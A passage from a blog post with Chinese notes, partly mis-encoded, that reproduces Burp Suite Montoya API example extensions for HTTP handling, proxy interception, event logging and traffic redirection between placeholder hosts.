function_">MyHttpHandler</span><span class="params">(MontoyaApi api)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.logging = api.logging();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> RequestToBeSentAction <span class="title function_">handleHttpRequestToBeSent</span><span class="params">(HttpRequestToBeSent requestToBeSent)</span> &#123;</span><br><span class="line">        <span class="type">Annotations</span> <span class="variable">annotations</span> <span class="operator">=</span> requestToBeSent.annotations();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If the request is a post, log the body and add notes.</span></span><br><span class="line">        <span class="keyword">if</span> (isPost(requestToBeSent)) &#123;</span><br><span class="line">            annotations = annotations.withNotes(<span class="string">&quot;Request was a post&quot;</span>);</span><br><span class="line">            logging.logToOutput(requestToBeSent.bodyToString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Modify the request by adding url param.</span></span><br><span class="line">        <span class="type">HttpRequest</span> <span class="variable">modifiedRequest</span> <span class="operator">=</span> requestToBeSent.withAddedParameters(urlParameter(<span class="string">&quot;foo&quot;</span>, <span class="string">&quot;bar&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Return the modified request to burp with updated annotations.</span></span><br><span class="line">        <span class="keyword">return</span> continueWith(modifiedRequest, annotations);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ResponseReceivedAction <span class="title function_">handleHttpResponseReceived</span><span class="params">(HttpResponseReceived responseReceived)</span> &#123;</span><br><span class="line">        <span class="type">Annotations</span> <span class="variable">annotations</span> <span class="operator">=</span> responseReceived.annotations();</span><br><span class="line">        <span class="comment">//Highlight all responses where the request had a Content-Length header.</span></span><br><span class="line">        <span class="keyword">if</span> (responseHasContentLengthHeader(responseReceived)) &#123;</span><br><span class="line">            annotations = annotations.withHighlightColor(HighlightColor.BLUE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> continueWith(responseReceived, annotations);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isPost</span><span class="params">(HttpRequestToBeSent httpRequestToBeSent)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> httpRequestToBeSent.method().equalsIgnoreCase(<span class="string">&quot;POST&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">responseHasContentLengthHeader</span><span class="params">(HttpResponseReceived httpResponseReceived)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> httpResponseReceived.initiatingRequest().headers().stream().anyMatch(header -&gt; header.name().equalsIgnoreCase(<span class="string">&quot;Content-Length&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>HttpHandlerExample.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> burp.api.montoya.BurpExtension;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.MontoyaApi;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//Burp will auto-detect and load any class that extends BurpExtension.</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HttpHandlerExample</span> <span class="keyword">implements</span> <span class="title class_">BurpExtension</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initialize</span><span class="params">(MontoyaApi api)</span> &#123;</span><br><span class="line">        api.extension().setName(<span class="string">&quot;HTTP Handler Example&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Register our http handler with Burp.</span></span><br><span class="line">        api.http().registerHttpHandler(<span class="keyword">new</span> <span class="title class_">MyHttpHandler</span>(api));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Proxy-Handler-Example-Extension"><a href="#Proxy-Handler-Example-Extension" class="headerlink" title="Proxy Handler Example Extension"></a>Proxy Handler Example Extension</h2><p>The extension works as follows:</p><ul><li>It registers a Proxy handler</li><li>For outgoing request messages:<ul><li>It drops all <code>POST</code> requests</li><li>Requests with <code>foo</code> in the URL are not intercepted</li><li>If the <code>Content-Type</code> is <code>JSON</code>, the request is highlighted <code>RED</code> and Burp rules for Interception are followed</li><li>All other requests are intercepted</li><li>User modified requests are continued as normal</li></ul></li><li>For incoming response messages:<ul><li>All responses that contain the string <code>username</code> are highlighted <code>BLUE</code></li><li>All other responses follow Burp rules for Interception</li></ul></li></ul><p>ProxyHandlerExample.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> burp.api.montoya.BurpExtension;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.MontoyaApi;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Burp will auto-detect and load any class that extends BurpExtension.</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProxyHandlerExample</span> <span class="keyword">implements</span> <span class="title class_">BurpExtension</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initialize</span><span class="params">(MontoyaApi api)</span></span><br><span class="line">    &#123;</span><br><span class="line">        api.extension().setName(<span class="string">&quot;Proxy Handler Example&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Register proxy handlers with Burp.</span></span><br><span class="line">        api.proxy().registerRequestHandler(<span class="keyword">new</span> <span class="title class_">MyProxyHttpRequestHandler</span>());</span><br><span class="line">        api.proxy().registerResponseHandler(<span class="keyword">new</span> <span class="title class_">MyProxyHttpResponseHandler</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MyProxyHttpResponseHandler.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> burp.api.montoya.proxy.http.InterceptedResponse;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.proxy.http.ProxyResponseHandler;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.proxy.http.ProxyResponseReceivedAction;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.proxy.http.ProxyResponseToBeSentAction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> burp.api.montoya.core.HighlightColor.BLUE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyProxyHttpResponseHandler</span> <span class="keyword">implements</span> <span class="title class_">ProxyResponseHandler</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ProxyResponseReceivedAction <span class="title function_">handleResponseReceived</span><span class="params">(InterceptedResponse interceptedResponse)</span> &#123;</span><br><span class="line">        <span class="comment">//Highlight all responses that have username in them</span></span><br><span class="line">        <span class="keyword">if</span> (interceptedResponse.bodyToString().contains(<span class="string">&quot;username&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> ProxyResponseReceivedAction.continueWith(interceptedResponse, interceptedResponse.annotations().withHighlightColor(BLUE));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ProxyResponseReceivedAction.continueWith(interceptedResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ProxyResponseToBeSentAction <span class="title function_">handleResponseToBeSent</span><span class="params">(InterceptedResponse interceptedResponse)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ProxyResponseToBeSentAction.continueWith(interceptedResponse);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MyProxyHttpRequestHandler.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> burp.api.montoya.proxy.http.InterceptedRequest;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.proxy.http.ProxyRequestHandler;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.proxy.http.ProxyRequestReceivedAction;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.proxy.http.ProxyRequestToBeSentAction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> burp.api.montoya.core.HighlightColor.RED;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> burp.api.montoya.http.message.ContentType.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyProxyHttpRequestHandler</span> <span class="keyword">implements</span> <span class="title class_">ProxyRequestHandler</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ProxyRequestReceivedAction <span class="title function_">handleRequestReceived</span><span class="params">(InterceptedRequest interceptedRequest)</span> &#123;</span><br><span class="line">        <span class="comment">//Drop all post requests</span></span><br><span class="line">        <span class="keyword">if</span> (interceptedRequest.method().equals(<span class="string">&quot;POST&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> ProxyRequestReceivedAction.drop();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Do not intercept any request with foo in the url</span></span><br><span class="line">        <span class="keyword">if</span> (interceptedRequest.url().contains(<span class="string">&quot;foo&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> ProxyRequestReceivedAction.doNotIntercept(interceptedRequest);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//If the content type is json, highlight the request and follow burp rules for interception</span></span><br><span class="line">        <span class="keyword">if</span> (interceptedRequest.contentType() == JSON) &#123;</span><br><span class="line">            <span class="keyword">return</span> ProxyRequestReceivedAction.continueWith(interceptedRequest, interceptedRequest.annotations().withHighlightColor(RED));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Intercept all other requests</span></span><br><span class="line">        <span class="keyword">return</span> ProxyRequestReceivedAction.intercept(interceptedRequest);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ProxyRequestToBeSentAction <span class="title function_">handleRequestToBeSent</span><span class="params">(InterceptedRequest interceptedRequest)</span> &#123;</span><br><span class="line">        <span class="comment">//Do nothing with the user modified request, continue as normal.</span></span><br><span class="line">        <span class="keyword">return</span> ProxyRequestToBeSentAction.continueWith(interceptedRequest);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/10/23/tools/burpsuite-plugins/image-1.png"><br>è§‚å¯Ÿå¯ä»¥çœ‹åˆ°ä¸Šé¢çš„ä»£ç ä¼¼ä¹å·²ç»å–ä»£äº†æˆ‘è¿™é‡Œçš„æ‹¦æˆªï¼Œå› ä¸ºå³ä¾¿æ˜¯æ‹¦æˆªå…³é—­çš„è¯ï¼Œä¹Ÿä¾æ—§æ˜¯æ‹¦æˆªçŠ¶æ€</p><h2 id="Event-Listeners-Example-Extension"><a href="#Event-Listeners-Example-Extension" class="headerlink" title="Event Listeners Example Extension"></a>Event Listeners Example Extension</h2><p>This extension demonstrates how to register listeners for various runtime events:</p><ul><li>HTTP requests and responses for all Burp tools.</li><li>HTTP messages intercepted by the Proxy.</li><li>Addition of new scan issues.</li><li>The extension being unloaded by the user.</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EventListeners</span> <span class="keyword">implements</span> <span class="title class_">BurpExtension</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Logging logging;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initialize</span><span class="params">(MontoyaApi api)</span> &#123;</span><br><span class="line">        logging = api.logging();</span><br><span class="line"></span><br><span class="line">        <span class="type">Http</span> <span class="variable">http</span> <span class="operator">=</span> api.http();</span><br><span class="line">        <span class="type">Proxy</span> <span class="variable">proxy</span> <span class="operator">=</span> api.proxy();</span><br><span class="line">        <span class="type">Extension</span> <span class="variable">extension</span> <span class="operator">=</span> api.extension();</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> api.scanner();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// set extension name</span></span><br><span class="line">        extension.setName(<span class="string">&quot;Event listeners&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// register a new HTTP handler</span></span><br><span class="line">        http.registerHttpHandler(<span class="keyword">new</span> <span class="title class_">MyHttpHandler</span>(api));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// register new Proxy handlers</span></span><br><span class="line">        proxy.registerRequestHandler(<span class="keyword">new</span> <span class="title class_">MyProxyRequestHandler</span>(api));</span><br><span class="line">        proxy.registerResponseHandler(<span class="keyword">new</span> <span class="title class_">MyProxyResponseHandler</span>(api));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// register a new Audit Issue handler</span></span><br><span class="line">        scanner.registerAuditIssueHandler(<span class="keyword">new</span> <span class="title class_">MyAuditIssueListenerHandler</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// register a new extension unload handler</span></span><br><span class="line">        extension.registerUnloadingHandler(<span class="keyword">new</span> <span class="title class_">MyExtensionUnloadHandler</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">MyAuditIssueListenerHandler</span> <span class="keyword">implements</span> <span class="title class_">AuditIssueHandler</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleNewAuditIssue</span><span class="params">(AuditIssue auditIssue)</span> &#123;</span><br><span class="line">            logging.logToOutput(<span class="string">&quot;New scan issue: &quot;</span> + auditIssue.name());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">MyExtensionUnloadHandler</span> <span class="keyword">implements</span> <span class="title class_">ExtensionUnloadingHandler</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">extensionUnloaded</span><span class="params">()</span> &#123;</span><br><span class="line">            logging.logToOutput(<span class="string">&quot;Extension was unloaded.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyHttpHandler</span> <span class="keyword">implements</span> <span class="title class_">HttpHandler</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Logging logging;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyHttpHandler</span><span class="params">(MontoyaApi api)</span></span><br><span class="line">    &#123;</span><br><span class="line">        logging = api.logging();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> RequestToBeSentAction <span class="title function_">handleHttpRequestToBeSent</span><span class="params">(HttpRequestToBeSent httpRequestToBeSent)</span> &#123;</span><br><span class="line">        logging.logToOutput(<span class="string">&quot;HTTP request to &quot;</span> + httpRequestToBeSent.httpService() + <span class="string">&quot; [&quot;</span> + httpRequestToBeSent.toolSource().toolType().toolName() + <span class="string">&quot;]&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> RequestToBeSentAction.continueWith(httpRequestToBeSent);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ResponseReceivedAction <span class="title function_">handleHttpResponseReceived</span><span class="params">(HttpResponseReceived httpResponseReceived)</span> &#123;</span><br><span class="line">        logging.logToOutput(<span class="string">&quot;HTTP response from &quot;</span> + httpResponseReceived.initiatingRequest().httpService() + <span class="string">&quot; [&quot;</span> + httpResponseReceived.toolSource().toolType().toolName() + <span class="string">&quot;]&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ResponseReceivedAction.continueWith(httpResponseReceived);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyProxyRequestHandler</span> <span class="keyword">implements</span> <span class="title class_">ProxyRequestHandler</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Logging logging;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyProxyRequestHandler</span><span class="params">(MontoyaApi api)</span></span><br><span class="line">    &#123;</span><br><span class="line">        logging = api.logging();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ProxyRequestReceivedAction <span class="title function_">handleRequestReceived</span><span class="params">(InterceptedRequest interceptedRequest)</span> &#123;</span><br><span class="line">        logging.logToOutput(<span class="string">&quot;Initial intercepted proxy request to &quot;</span> + interceptedRequest.httpService());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ProxyRequestReceivedAction.continueWith(interceptedRequest);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ProxyRequestToBeSentAction <span class="title function_">handleRequestToBeSent</span><span class="params">(InterceptedRequest interceptedRequest)</span> &#123;</span><br><span class="line">        logging.logToOutput(<span class="string">&quot;Final intercepted proxy request to &quot;</span> + interceptedRequest.httpService());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ProxyRequestToBeSentAction.continueWith(interceptedRequest);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyProxyResponseHandler</span> <span class="keyword">implements</span> <span class="title class_">ProxyResponseHandler</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Logging logging;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyProxyResponseHandler</span><span class="params">(MontoyaApi api)</span></span><br><span class="line">    &#123;</span><br><span class="line">        logging = api.logging();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ProxyResponseReceivedAction <span class="title function_">handleResponseReceived</span><span class="params">(InterceptedResponse interceptedResponse)</span> &#123;</span><br><span class="line">        logging.logToOutput(<span class="string">&quot;Initial intercepted proxy response from &quot;</span> + interceptedResponse.initiatingRequest().httpService());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ProxyResponseReceivedAction.continueWith(interceptedResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ProxyResponseToBeSentAction <span class="title function_">handleResponseToBeSent</span><span class="params">(InterceptedResponse interceptedResponse)</span> &#123;</span><br><span class="line">        logging.logToOutput(<span class="string">&quot;Final intercepted proxy response from &quot;</span> + interceptedResponse.initiatingRequest().httpService());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ProxyResponseToBeSentAction.continueWith(interceptedResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/10/23/tools/burpsuite-plugins/image-2.png" alt="åŸæ¥ä¸Šé¢çš„è¾“å‡ºoutæ˜¯æŒ‡è®°å½•åœ¨è¿™é‡Œå¯¼å…¥æ’ä»¶ä¹‹åçš„out"><br><img src="/2024/10/23/tools/burpsuite-plugins/image-3.png" alt="åœ¨æ’ä»¶é¡µé¢è¿™é‡Œä¹Ÿå¯ä»¥çœ‹åˆ°"></p><h2 id="Traffic-Redirector-Example-Extension"><a href="#Traffic-Redirector-Example-Extension" class="headerlink" title="Traffic Redirector Example Extension"></a>Traffic Redirector Example Extension</h2><p>This extension demonstrates how to redirect outgoing HTTP requests from one host to another. This task might arise, for example, if you have mapped out an application which then moves to a different staging URL. By simply redirecting traffic to the new hostname, you can continue to drive your testing from the original site map.</p><p>The extension works as follows:</p><ul><li>It registers an HTTP handler.</li><li>For outgoing request messages, it retrieves the HTTP service for the request.</li><li>If the HTTP service host matches the â€œfromâ€ host, builds an HTTP service using the â€œtoâ€ host, and other details unchanged.</li><li>It returns the HTTP request with the new HTTP service.</li></ul><p><strong>Note:</strong> The sample code uses â€œhost1.example.orgâ€ and â€œhost2.example.orgâ€ as the â€œfromâ€ and â€œtoâ€ hostnames. You should edit the code to use your own hostnames before using it.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrafficRedirector</span> <span class="keyword">implements</span> <span class="title class_">BurpExtension</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">HOST_FROM</span> <span class="operator">=</span> <span class="string">&quot;host1.example.org&quot;</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">HOST_TO</span> <span class="operator">=</span> <span class="string">&quot;host2.example.org&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initialize</span><span class="params">(MontoyaApi api)</span> &#123;</span><br><span class="line">        <span class="comment">// set extension name</span></span><br><span class="line">        api.extension().setName(<span class="string">&quot;Traffic redirector&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// register a new HTTP handler</span></span><br><span class="line">        api.http().registerHttpHandler(<span class="keyword">new</span> <span class="title class_">MyHttpHandler</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.HttpService;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.handler.*;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.message.requests.HttpRequest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> burp.api.montoya.http.HttpService.httpService;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> burp.api.montoya.http.handler.RequestToBeSentAction.continueWith;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyHttpHandler</span> <span class="keyword">implements</span> <span class="title class_">HttpHandler</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> RequestToBeSentAction <span class="title function_">handleHttpRequestToBeSent</span><span class="params">(HttpRequestToBeSent httpRequestToBeSent)</span> &#123;</span><br><span class="line">        <span class="type">HttpService</span> <span class="variable">service</span> <span class="operator">=</span> httpRequestToBeSent.httpService();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (TrafficRedirector.HOST_FROM.equalsIgnoreCase(service.host())) &#123;</span><br><span class="line">            <span class="type">HttpRequest</span> <span class="variable">updatedHttpServiceRequest</span> <span class="operator">=</span> httpRequestToBeSent.withService(httpService(TrafficRedirector.HOST_TO, service.port(), service.secure()));</span><br><span class="line">            <span class="type">HttpRequest</span> <span class="variable">updatedHostHeaderRequest</span> <span class="operator">=</span> updatedHttpServiceRequest.withUpdatedHeader(<span class="string">&quot;Host&quot;</span>, TrafficRedirector.HOST_TO);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> 